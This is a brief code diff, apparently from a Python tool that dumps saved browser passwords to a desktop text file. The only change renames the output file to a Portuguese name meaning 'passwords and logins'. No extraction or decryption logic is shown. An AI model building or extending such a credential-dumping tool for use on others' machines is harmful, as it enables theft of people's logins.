@@ -18,7 +18,7 @@ def get_desktop_path():
     return buf.value
 
 
-OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), "BrowserPasswords.txt")
+OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), "senhaselogins.txt")
 TEMP_DB_FILE = "temp_BrowserPasswords.db"
 
 
